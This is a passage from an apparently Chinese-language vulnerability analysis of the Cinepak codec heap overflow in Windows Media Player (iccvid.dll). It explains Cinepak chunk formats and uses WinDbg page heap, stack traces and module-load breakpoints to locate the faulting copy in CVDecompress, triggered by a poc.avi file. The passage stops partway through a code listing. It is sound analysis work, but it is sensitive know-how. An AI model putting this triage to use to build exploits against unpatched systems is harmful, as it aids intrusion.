<p>&emsp;&emsp;在<code>8bpp模式</code>(<code>0x2400</code>和<code>0x2600</code>)中，每个<code>codebook条目</code>用<code>4个字节</code>(亮度值)定义。块中定义的<code>codebook条目总数</code>取决于<code>块大小</code>(分别为<code>12bpp</code>和<code>8bpp</code>的<code>size/6</code>或<code>size/4</code>)。</p>
<h4 id="5、Inter-selective-list-of-library-blocks-IDs-0x2100-0x2300-0x2500-0x2700"><a href="#5、Inter-selective-list-of-library-blocks-IDs-0x2100-0x2300-0x2500-0x2700" class="headerlink" title="5、Inter selective list of library blocks(IDs 0x2100, 0x2300, 0x2500, 0x2700)"></a>5、Inter selective list of library blocks(IDs 0x2100, 0x2300, 0x2500, 0x2700)</h4><p>&emsp;&emsp;在<code>inter-frame</code>(或<code>非key-frames</code>)中，来自<code>前一帧的向量</code>可用于<code>当前帧</code>。<code>无法重用的向量</code>可以使用<code>此块</code>进行如下修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">     7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">    +---------------+</span><br><span class="line"> 0  |               |       Update Flags                  Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 1  |               |</span><br><span class="line">    +-             -+</span><br><span class="line"> 2  |               |</span><br><span class="line">    +-             -+</span><br><span class="line"> 3  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 4  |               |       Luminance value 0             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 5  |               |       Luminance value 1             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 6  |               |       Luminance value 2             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 7  |               |       Luminance value 3             Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 8  |               |       U Chrominance value           Byte</span><br><span class="line">    +---------------+</span><br><span class="line"> 9  |               |       V Chrominance value           Byte</span><br><span class="line">    +---------------+</span><br><span class="line">10  |       .       |</span><br><span class="line">            .       </span><br><span class="line">    |       .       |</span><br><span class="line">    +---------------+</span><br><span class="line">    |       .       |       Update Flags                  Unsigned</span><br><span class="line">    +-      .      -+</span><br><span class="line">            .</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li><strong><code>Update Flags</code></strong> - <code>每个位</code>指示<code>codebook条目</code>是否<code>被更新</code>。如果<code>该位为1</code>，则<code>codebook条目</code>将被<code>下一个6或4个字节</code>替换(取决于模式)，否则<code>条目位置</code>保持不变。</li>
</ul>
</blockquote>
<h4 id="6、Vectors-used-to-encode-a-frame-ID-0x3000"><a href="#6、Vectors-used-to-encode-a-frame-ID-0x3000" class="headerlink" title="6、Vectors used to encode a frame(ID 0x3000)"></a>6、Vectors used to encode a frame(ID 0x3000)</h4><p>&emsp;&emsp;最初，从块中读取<code>4个字节</code>，它们定义了<code>一组标志</code>。<code>一组标志</code>对<code>32个块</code>进行编码，<code>每个块</code>使用<code>一位</code>。32个1位标志(从flags变量中的<code>最高有效位</code>开始)中的<code>每个标志</code>定义了该块所代表的<code>编码技术</code>。如果<code>标志为1</code>，则将该块<code>编码为V4</code>(4个向量=4个字节)，否则将该块<code>编码为V1</code>(1个向量=1个字节)。解析完<code>32个块</code>之后，必须从块中读取<code>另外4个字节</code>，并将其用作<code>下一组标志</code>。</p>
<h4 id="7、Selective-set-of-vectors-used-to-encode-a-frame-ID-0x3100"><a href="#7、Selective-set-of-vectors-used-to-encode-a-frame-ID-0x3100" class="headerlink" title="7、Selective set of vectors used to encode a frame(ID 0x3100)"></a>7、Selective set of vectors used to encode a frame(ID 0x3100)</h4><p>&emsp;&emsp;在<code>inter-frame</code>编码中，并非一帧中的<code>所有块</code>都需要<code>更新</code>。与前面的块一样，<code>4个字节</code>代表<code>一组标志</code>，但是在这种情况下，为每个块选择<code>三个编码</code>之一。给定标志位，该块将是：</p>
<blockquote>
<ul>
<li><strong><code>0</code></strong> = 跳过该块</li>
<li><strong><code>10</code></strong> = V1编码块</li>
<li><strong><code>11</code></strong> = V4编码块</li>
</ul>
</blockquote>
<p>&emsp;&emsp;也就是说，如果当前<code>标志位为0</code>，则将<code>跳过该块</code>。如果<code>标志位为1</code>，则<code>随后的位</code>将确定使用<code>两种编码类型</code>中的哪一种(可变长度编码(VLC)的简单形式)。</p>
<h4 id="8、List-of-blocks-from-only-the-V1-codebook-ID-0x3200"><a href="#8、List-of-blocks-from-only-the-V1-codebook-ID-0x3200" class="headerlink" title="8、List of blocks from only the V1 codebook(ID 0x3200)"></a>8、List of blocks from only the V1 codebook(ID 0x3200)</h4><p>&emsp;&emsp;用此<code>块类型</code>编码的所有块均由<code>V1向量</code>表示。即，该块中的<code>每个字节</code>代表<code>每个块</code>的<code>一个向量</code>。</p>
<h3 id="0x33-定位漏洞点"><a href="#0x33-定位漏洞点" class="headerlink" title="0x33 定位漏洞点"></a>0x33 定位漏洞点</h3><p>&emsp;&emsp;首先打开<code>Windows Media Player</code>，然后用<code>WinDbg</code>附加进程<code>wmplayer.exe</code>，然后通过<code>!gflag</code>命令<code>开启页堆</code>，通过<code>页堆(HeapPage)</code>进行<code>堆溢出漏洞</code>的调试。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(fdc<span class="meta">.638</span>): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffdd000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=01d0ffcc <span class="built_in">ebp</span>=01d0fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; !gflag +hpa</span><br><span class="line">New NtGlobalFlag contents: <span class="number">0x02000000</span></span><br><span class="line">    hpa - Place heap allocations <span class="meta">at</span> ends of pages</span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 7cf70000 7d0d9000   C:\WINDOWS\system32\quartz.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75af0000 75b01000   C:\WINDOWS\system32\devenum.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">73620000</span> <span class="number">73627000</span>   C:\WINDOWS\system32\msdmo.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76320000</span> <span class="number">76367000</span>   C:\WINDOWS\system32\comdlg32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76d70000 76d92000   C:\WINDOWS\system32\appHelp.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76590000</span> 765de000   C:\WINDOWS\System32\cscui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76570000</span> 7658c000   C:\WINDOWS\System32\CSCDLL.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 75ef0000 75fed000   C:\WINDOWS\system32\browseui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76960000</span> <span class="number">76984000</span>   C:\WINDOWS\system32\ntshrui.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 76af0000 76b01000   C:\WINDOWS\system32\ATL.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 759d0000 75a7f000   C:\WINDOWS\system32\USERENV.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> <span class="number">76950000</span> <span class="number">76958000</span>   C:\WINDOWS\system32\LINKINFO.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 736d0000 7371b000   C:\WINDOWS\system32\DDRAW.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b30000 73b36000   C:\WINDOWS\system32\DCIMAN32.dll</span><br><span class="line"><span class="symbol">ModLoad:</span> 738b0000 <span class="number">73980000</span>   C:\WINDOWS\system32\D3DIM700.DLL</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll</span><br><span class="line">(fdc.cf4): Access violation - code c0000005 (first chance) &lt;---- 内存访问违例</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=00140a18 <span class="built_in">ecx</span>=<span class="number">00000298</span> <span class="built_in">edx</span>=0221fd38 <span class="built_in">esi</span>=<span class="number">00146000</span> <span class="built_in">edi</span>=<span class="number">00148000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0221fd04 <span class="built_in">ebp</span>=0221fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</span><br><span class="line"><span class="number">0</span>:<span class="number">015</span>&gt; !address <span class="number">00148000</span></span><br><span class="line"><span class="symbol">Usage:</span>                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">00090000</span></span><br><span class="line">Base Address:           <span class="number">00148000</span></span><br><span class="line">End Address:            <span class="number">00190000</span></span><br><span class="line">Region Size:            <span class="number">00048000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00020000</span>    MEM_PRIVATE</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00002000</span>    MEM_RESERVE</span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">015</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0221fd30 73b7cbf3 <span class="number">00000004</span> <span class="number">00000000</span> <span class="number">00000068</span> iccvid!CVDecompress+<span class="number">0x11e</span>(<span class="number">0x73b722cc</span>当前指令地址)</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">0221fd60 73b766c8 0013abc0 <span class="number">00000000</span> 0013de88 iccvid!Decompress+<span class="number">0x11d</span>(<span class="number">0x73b7cbf3</span>)[73b7cbee <span class="keyword">call</span> iccvid!CVDecompress (73b721ae)的返回地址]</span><br><span class="line">            ↑------------------------------------------↓</span><br><span class="line">0221fdac 73b41938 0013abc0 <span class="number">00000001</span> <span class="number">0000400d</span> iccvid!DriverProc+<span class="number">0x1bf</span>(<span class="number">0x73b766c8</span>)[73b766c3 <span class="keyword">call</span> iccvid!Decompress (73b7cad6)的返回地址]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;开启<code>页堆(HeapPage)</code>后，运行程序，会发生<code>内存访问异常</code>(异常代码:<code>0xC0000005h</code>)而中断，通过以上调试信息，可以看出<code>0x73b722cc</code>处的<code>内存复制指令</code>发生<code>内存访问异常</code>。此时的<code>edi</code>指向的内存的<code>内存状态(State)</code>为<code>MEM_RESERVE</code>，即<code>保留内存</code>，保留内存尚不能被<code>实际使用</code>，但其地址空间已被预留，尚需一个<code>提交动作</code>。所以<code>edi</code>指向的内存是<code>不能访问</code>的。</p>
<p>&emsp;&emsp;查看此时的<code>栈回溯</code>，我们可以知道<code>触发异常</code>的指令位于<code>iccvid.dll</code>中的<code>CVDecompress函数</code>中，其父函数为<code>iccvid!Decompress</code>。调用<code>CVDecompress函数</code>的指令位于地址<code>0x73b7cbee</code>处，我们需要对此地址<code>下断点</code>，才能进入<code>CVDecompress函数</code>，分析其<code>功能</code>。但是，由于该地址位于<code>iccvid.dll</code>模块中，而<code>iccvid.dll</code>只有在解析<code>poc.avi</code>时才会被<code>动态加载</code>。若重新<code>附加进程</code>，是<code>未加载</code>iccvid.dll模块的，这里有<code>两种解决方案</code>。</p>
<blockquote>
<ul>
<li>1、利用<code>OllyDbg</code>或<code>Immunity Debugger</code>调试器附加进程<code>wmplayer.exe</code>，<code>F9</code>运行后，打开<code>poc.avi</code>，会中断在<code>异常</code>处，此时已经加载了<code>iccvid.dll</code>，现在对地址<code>0x73b7cbee</code>下断点，<code>断点信息</code>会保存在<code>.udd</code>文件中。或者通过<code>插件</code>注入<code>iccvid.dll</code>后下断点。<code>正常情况</code>下，下次重新附加<code>wmplayer.exe</code>，<code>F9</code>运行后重新打开<code>poc.avi</code>，加载<code>iccvid.dll</code>时会<code>激活断点</code>，之后就会断在地址<code>0x73b7cbee</code>处。但是好像<code>OllyDbg</code>或<code>Immunity Debugger</code>有<code>Bug</code>，无法在<code>加载iccvid.dll</code>时，自动<code>激活断点</code>，打开<code>模块窗口</code>后，断点才会<code>激活</code>，所以无法断在断点处。使用<code>OllyDbg v2.0</code>或<code>x64dbg</code>可以解决此问题。</li>
<li>2、利用<code>WinDbg</code>的<code>sxe ld:ModuleName</code>命令，可以在<code>首次</code>加载<code>iccvid.dll</code>时断下，然后可以对地址<code>0x73b7cbee</code>下断点。此方法的不方便之处在于每次<code>重新附加程序</code>都需要<code>重新设置断点</code>，很麻烦(可能我没找到好的解决办法)。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;这里我们使用<code>第2种方法</code>，在使用<code>sxe ld:ModuleName</code>命令后，会中断在<code>iccvid.dll</code>加载后调用的<code>ntdll!KiFastSystemCallRet</code>函数处。<code>sxe命令</code>的功能为，当<code>发生异常</code>时，<code>目标程序</code>将在其他任何<code>异常处理程序</code>被激活之前立即中断并进入<code>调试器</code>，这种处理称为<code>处理异常的第一次机会</code>。<code>ld[:Module]</code>，如果<code>指定Module</code>，则在加载具有<code>该名称的模块</code>时会发生中断。如果<code>省略Module</code>，则在加载<code>任何模块</code>时触发事件。中断后，通过kb查看<code>栈回溯</code>，可以知道<code>中断指令所在函数</code>的<code>函数调用链</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">(a1c<span class="meta">.630</span>): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffde000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=01b6ffcc <span class="built_in">ebp</span>=01b6fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; sxe ld:iccvid                                                            <span class="comment">; 在加载iccvid.dll时中断</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=<span class="number">00000044</span> <span class="built_in">edx</span>=00092ee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e4f4 <span class="built_in">esp</span>=01f6e298 <span class="built_in">ebp</span>=01f6e38c iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">7c92e4f4 c3              <span class="keyword">ret</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">01c8e294 7c92d50c 7c93bd03 000004ac ffffffff ntdll!KiFastSystemCallRet</span><br><span class="line">01c8e298 7c93bd03 000004ac ffffffff 01c8e370 ntdll!ZwMapViewOfSection+<span class="number">0xc</span></span><br><span class="line">01c8e38c 7c93624a 00093cb8 01c8e418 01c8e940 ntdll!LdrpMapDll+<span class="number">0x330</span></span><br><span class="line">01c8e64c 7c9364b3 <span class="number">00000000</span> 00093cb8 01c8e940 ntdll!LdrpLoadDll+<span class="number">0x1e9</span></span><br><span class="line">01c8e8f4 7c801bbd 00093cb8 01c8e940 01c8e920 ntdll!LdrLoadDll+<span class="number">0x230</span></span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">01c8e95c 7c80aefc 01c8e988 <span class="number">00000000</span> <span class="number">00000000</span> kernel32!LoadLibraryExW+<span class="number">0xc8</span></span><br><span class="line">01c8e970 76b13384 01c8e988 7c9210e0 76b30160 kernel32!LoadLibraryW+<span class="number">0x11</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; lm v m iccvid</span><br><span class="line">start    end        module name</span><br><span class="line">73b70000 73b87000   iccvid     (deferred)                                       <span class="comment">; iccvid.dll加载基址</span></span><br><span class="line">    Image path: C:\WINDOWS\system32\iccvid.dll</span><br><span class="line">    Image name: iccvid.dll</span><br><span class="line"><span class="symbol">    Timestamp:</span>        Mon Apr <span class="number">14</span> <span class="number">10</span>:<span class="number">12</span>:<span class="number">25</span> <span class="number">2008</span> (4802BD89)</span><br><span class="line"><span class="symbol">    CheckSum:</span>         000219FF</span><br><span class="line"><span class="symbol">    ImageSize:</span>        <span class="number">00017000</span></span><br><span class="line">    File version:     <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.12</span></span><br><span class="line">    Product version:  <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">    File flags:       <span class="number">0</span> (Mask 3F)</span><br><span class="line">    File OS:          <span class="number">40004</span> NT Win32</span><br><span class="line">    File type:        <span class="number">3.8</span> Driver</span><br><span class="line">    File date:        <span class="number">00000000.00000000</span></span><br><span class="line"><span class="symbol">    Translations:</span>     <span class="number">0409.04e4</span></span><br><span class="line"><span class="symbol">    CompanyName:</span>      Radius <span class="keyword">Inc</span>.</span><br><span class="line"><span class="symbol">    ProductName:</span>      Cinepak for Windows <span class="number">32</span></span><br><span class="line"><span class="symbol">    InternalName:</span>     iccvid</span><br><span class="line"><span class="symbol">    OriginalFilename:</span> iccvid.drv</span><br><span class="line"><span class="symbol">    ProductVersion:</span>   <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line"><span class="symbol">    FileVersion:</span>      <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.11</span></span><br><span class="line"><span class="symbol">    FileDescription:</span>  Cinepak® Codec</span><br><span class="line"><span class="symbol">    LegalCopyright:</span>   Copyright © <span class="number">1992</span>-<span class="number">1995</span> Radius <span class="keyword">Inc</span>., All Rights Reserved</span><br><span class="line"><span class="symbol">    LegalTrademarks:</span>  Cinepak® is a trademark of Radius <span class="keyword">Inc</span>.</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过<code>“lm v m iccvid”</code>命令，我们可以看到<code>iccvid.dll</code>已经<code>被加载</code>，这时可以对位于地址<code>0x73b7cbee</code>处的调用<code>CVDecompress函数</code>的指令下断点，然后观察传入<code>CVDecompress函数</code>的参数，以及分析<code>函数功能</code>，分析结果如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span 